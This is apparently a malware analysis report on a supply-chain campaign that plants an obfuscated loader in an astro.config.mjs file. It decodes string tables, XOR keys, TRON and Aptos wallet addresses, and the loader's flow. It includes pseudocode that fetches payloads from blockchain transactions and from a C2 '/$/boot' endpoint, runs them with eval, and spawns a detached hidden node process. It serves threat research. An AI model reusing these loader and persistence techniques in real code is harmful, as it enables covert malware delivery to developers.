# Task AH: `ThZG+0jfXE6VAGOJ` Key — Usage Identification

**Date:** 2026-06-28  
**Task:** Find the Stage 1 variant that uses `ThZG+0jfXE6VAGOJ`, determine which channel/response
it decrypts, and confirm whether it is still in use.

---

## Summary

`ThZG+0jfXE6VAGOJ` is **NOT a Stage 1 key**. It is a **Stage 2 key** used in the W2 direct-HTTP
channel to XOR-decrypt the C2 HTTP response containing Stage 3. The SafeDep report's description
of it as a "Stage 1 variant" key is imprecise — they were describing the payload that beacons
directly to C2 without a blockchain hop, which in our numbering is Stage 2 (the Beavertail RAT),
not Stage 1 (the blockchain fetcher).

As a side effect of this investigation, full decode of the `astro.config.mjs` Stage 1 body
revealed new IOCs and behavioral details not previously documented.

---

## Part 1: Where `ThZG+0jfXE6VAGOJ` Actually Lives

### Confirmed Location: W2 Stage 2, String Table Entry [29]

The key appears in the `_$_a478` string table (Task B, ANALYSIS_W2_STAGE1.md):

```
[29]: "ThZG+0jfXE6VAGOJ"      ← Stage 3 XOR decrypt key (W2 direct-HTTP path)
```

**Usage** (W2 Stage 2 decoded pseudocode, Task B):
```javascript
const url = (c['_H'] || c['_H2']) + '/$/boot';
const response = await fetch_http(url, {
  method: 'GET',
  headers: { 'Sec-V': campaignId }
});
// XOR-decrypt HTTP response body with this key → Stage 3
const stage3 = xor_decrypt(response_body, "ThZG+0jfXE6VAGOJ");
eval(stage3);
```

The key decrypts the **HTTP response body from the C2 server at `/$/boot`** — the actor XOR-encrypts
Stage 3 in transit to prevent passive capture. The decrypted result is eval'd directly.

### Confirmed Present In:

| Payload | Cipher | Key location | Confirmed |
|---------|--------|--------------|-----------|
| W2 Stage 2 (`_$_a478`, 5-3-161) | `_$_a478[29]` | `/$/boot` HTTP response | ANALYSIS_W2_STAGE1.md |
| W2 Stage 2 (`_$_f5f0`, Jun 25) | `[27]` | Stage 3 XOR key (unchanged) | ANALYSIS_F5F0_STAGE2.md |
| `ANALYSIS_REPORT_5-3-161.md` | `_$_9b39[29]` | C2 HTTP response → Stage 3 | ANALYSIS_REPORT_5-3-161.md |

### Confirmed NOT Present In:

| Payload | Reason |
|---------|--------|
| astro.config.mjs Stage 1 (pYd) | Full decode below — 58-entry table has only `2[gWfGj]` and `m6:tTh` |
| RS260605 Stage 2 C2-served (67K/70K) | All strings inline-encrypted — not findable in plaintext |
| Stage 1 variants on W1 channel | W1 uses `2[gWfGj;<:-93Z^C` for blockchain; no HTTP C2 step |

---

## Part 2: SafeDep's Description — Reconciled

SafeDep wrote:

> "two separate XOR operations in one Stage 1 variant:  
> 1. XOR with `ThZG+0jfXE6VAGOJ` to decrypt the C2 HTTP response  
> 2. XOR with `2[gWfGj;<:-93Z^C` to decrypt the blockchain-fetched Stage 2"

**What they were actually describing:**

SafeDep appears to have analyzed the W2 channel delivery chain and described it from the victim's
perspective as a single "Stage 1 variant." The two XOR operations they describe belong to
**two different payloads**:

1. XOR with `2[gWfGj;<:-93Z^C` → done by Stage 1 (the astro.config.mjs IIFE, or any blockchain
   fetcher) to decrypt Stage 2 from the BSC transaction data
2. XOR with `ThZG+0jfXE6VAGOJ` → done by Stage 2 (the W2 Beavertail variant) to decrypt Stage 3
   from the C2 HTTP response

In our stage numbering, this is a Stage 1 → Stage 2 hand-off, not one payload doing both. SafeDep's
"Stage 1 variant" maps to our Stage 2 (the direct-HTTP W2 beacon). Their terminology differs
from ours: they call the first observed payload "Stage 1" regardless of whether it is a loader or
the Beavertail RAT itself.

The key implication: **`ThZG+0jfXE6VAGOJ` is a C2-to-victim transport key for Stage 3**,
not a blockchain dead-drop key. It is in Stage 2, not Stage 1.

---

## Part 3: astro.config.mjs Stage 1 — Full Decode (Side Effect of AH)

Decoding the `drewroberts/website/astro.config.mjs` IIFE revealed Stage 1 internals not previously
documented for the astro vector.

### Outer cipher decode

```
_$_1e42 decoded: ['r', 'object', 'm']
```

- `global['r'] = require` — CommonJS require exposed globally
- `global['m'] = module` — CommonJS module exposed globally (if `typeof module === 'object'`)
- Cipher input: `"rmcej%otb%"`, seed: `2857687`

### Stage 1 inner cipher (`_$af163278`)

The 58-entry string table uses the **same `_$af163278` cipher** as the `_$_1e42` Task O analysis
(ANALYSIS_1E42_C2.md): seed `1812138`, off1=139, off2=473, mod1=20044, mod2=41543, mod=5446973.
The astro Stage 1 is the **same codebase** as the saif72437 `_$_1e42` cluster.

### Full `_$_ccfc` string table (astro.config.mjs, `drewroberts/website`)

```
[0]  = "r"                           ← require (global reference)
[1]  = "_V"                          ← global campaign ID var
[2]  = "A"                           ← prefix added to outer campaign ID
[3]  = "!"                           ← global['!'] = outer campaign ID key
[4]  = "end"                         ← http event
[5]  = "error"                       ← http event
[6]  = "on"                          ← EventEmitter method
[7]  = ""                            ← empty string
[8]  = "data"                        ← http data event
[9]  = "parse"                       ← JSON.parse
[10] = "JSON"
[11] = "get"                         ← http.get
[12] = "https"                       ← require('https') for TRON API
[13] = "Promise"
[14] = "2.0"                         ← JSON-RPC version
[15] = "stringify"                   ← JSON.stringify
[16] = "POST"                        ← HTTP method for BSC RPC
[17] = "request"                     ← https.request
[18] = "write"                       ← req.write (POST body)
[19] = "join"                        ← Array.join (used in dead-code check)
[20] = "reverse"                     ← BSC TX hash reversal step
[21] = "split"                       ← string split
[22] = "utf8"                        ← Buffer encoding
[23] = "toString"                    ← Buffer.toString
[24] = "raw_data"                    ← TRON API response field for memo
[25] = "/transactions?only_confirmed=true&only_from=true&limit=1"  ← TRON API path
[26] = "hex"                         ← Buffer hex encoding
[27] = "from"                        ← Buffer.from
[28] = "Buffer"
[29] = "arguments"                   ← used to get TRON function params
[30] = "payload"                     ← Aptos payload field
[31] = "/transactions?limit=1"       ← Aptos API path
[32] = "?.?"                         ← BSC payload separator (dead-code anti-debug check)
[33] = "substring"                   ← string extract
[34] = "input"                       ← BSC TX 'input' field
[35] = "result"                      ← JSON-RPC result field
[36] = "eth_getTransactionByHash"    ← BSC RPC method
[37] = "bsc-dataseed.binance.org"    ← BSC node (primary)
[38] = "bsc-rpc.publicnode.com"      ← BSC node (fallback)
[39] = "length"
[40] = "charCodeAt"
[41] = "fromCharCode"
[42] = "String"
[43] = "getTime"
[44] = "Date"
[45] = "_p_t"                        ← infection timestamp global
[46] = "2[gWfGj;<:-93Z^C"           ← W1 XOR key (blockchain decryption)
[47] = "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP"    ← TRON W1 wallet
[48] = "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e"  ← Aptos A1 fallback
[49] = "m6:tTh^D)cBz?NM]"           ← W2 XOR key (blockchain decryption)
[50] = "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG"    ← TRON W2 wallet
[51] = "0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3"  ← Aptos A2 fallback
[52] = "node"                        ← Stage 2 spawn command
[53] = "-e"                          ← node -e flag
[54] = "';"                          ← campaign ID assignment closer
[55] = "ignore"                      ← stdio: 'ignore'
[56] = "spawn"                       ← child_process.spawn
[57] = "child_process"               ← require('child_process')
```

### Stage 1 execution flow (decoded)

```javascript
// 1. Set global campaign ID: 'A' + outer_campaign_id
global['_V'] = 'A' + global['!'];   // e.g. 'A9-0264-2'

// 2. Anti-abuse: skip if re-triggered within 30 seconds
global['_p_t'] = new Date().getTime();
if (global['_p_t'] && now - global['_p_t'] < 30000) { return; }

// 3. Try W1 channel (TRON TMfKQEd7... → BSC → XOR '2[gWfGj;<:-93Z^C' → Stage 2)
try {
  const r = await fetchBlockchain('2[gWfGj;<:-93Z^C', 'TMfKQEd7...', '0xbe03740...');
  eval(r);  // Stage 2 eval'd in-process
} catch(e) {}

// 4. Try W2 channel (TRON TXfxHUet... → BSC → XOR 'm6:tTh^D)cBz?NM]' → Stage 2)
try {
  const r = await fetchBlockchain('m6:tTh^D)cBz?NM]', 'TXfxHUet...', '0x3f0e578...');
  // Stage 2 spawned as DETACHED child process (persists after astro build exits)
  require('child_process').spawn('node', ['-e',
    "global['_V']='A9-0264-2';" + r
  ], { detached: true, stdio: 'ignore', windowsHide: true });
} catch(e) {}
```

**Key behavioral differences from npm/tasks.json Stage 1:**
- W1 Stage 2 is `eval()`'d **in the current process** — runs while astro build is active
- W2 Stage 2 is spawned as a **detached, windowless child** — survives after build completes
- Both channels are attempted regardless of W1 success

### Anti-debug dead code: `_$_ccfc[32]`

The check `if (_$af163278 == _$_ccfc[32])` decodes to:
```javascript
if (cipher_function == "?.?") { ... }  // always false — function ≠ string
```

`"?.?"` is the BSC payload separator, not an analysis environment indicator. This is obfuscated
dead code to mislead static analysts.

### Campaign ID routing implications for astro victims

The astro Stage 1 sets `_V = 'A' + campaign_id` (e.g. `'A9-0264-2'`). In Stage 2:
- **W2 `_$_f5f0` (Jun 25 routing)**: `'A...'` prefix → silent drop
- **W1 blockchain Stage 2 (Jun 8)**: `'A...'` prefix → beacon to `23.27.13.43` (now dead)

**Astro victims are effectively unreachable by the current C2 infrastructure.** The actor may be
staging a new Stage 2 build with updated routing, or the 'A9-xxxx' / 'A8-xxxx' prefix range
is not yet handled in the live routing table.

---

## Conclusion

| Question | Answer |
|----------|--------|
| Which Stage 1 uses `ThZG+0jfXE6VAGOJ`? | **None** — it is in Stage 2, not Stage 1 |
| What does `ThZG+0jfXE6VAGOJ` decrypt? | Stage 3 (socket.io backdoor) delivered via HTTP at `/$/boot` |
| Is it still in use? | **Yes** — present unchanged in Jun 25 W2 Stage 2 (`_$_f5f0`) |
| Is it in the astro.config.mjs Stage 1? | **No** — astro Stage 1 uses only `2[gWfGj` and `m6:tTh` |
| Is it in the RS260605 C2-served Stage 2? | Cannot confirm — all strings are inline-encrypted |

SafeDep's "Stage 1 variant using ThZG" = our Stage 2 (W2 direct-HTTP channel, `_$_a478` / `_$_9b39`).

The `ThZG+0jfXE6VAGOJ` key role is definitively: **Stage 3 transport encryption** — used by Stage 2
to decrypt Stage 3 from the C2 server HTTP response. It is not a blockchain, blockchain-fallback,
or Stage 1 key.

---

## New Findings (Side Effect of astro Stage 1 Decode)

| Finding | Notes |
|---------|-------|
| astro Stage 1 uses same `_$af163278` cipher (seed 1812138) as `_$_1e42` Task O | Infrastructure continuity confirmed |
| astro Stage 1 tries W1 (`eval()` in-process) THEN W2 (`spawn()` detached) | Dual-channel delivery with process persistence |
| W2 Stage 2 spawned as detached windowless child → survives build process exit | Persistence mechanism via OS detached process |
| `global['_V'] = 'A' + global['!']` prefix logic confirmed in astro variant | Same routing table prefix as other Stage 1 variants |
| 'A8-xxxx'/'A9-xxxx' campaign IDs route to dead/silent infrastructure | Astro victims not currently being exfiltrated via live C2 |
| `"?.?"` anti-debug check is dead code (function ≠ string always) | Obfuscation tactic, not actual sandbox detection |
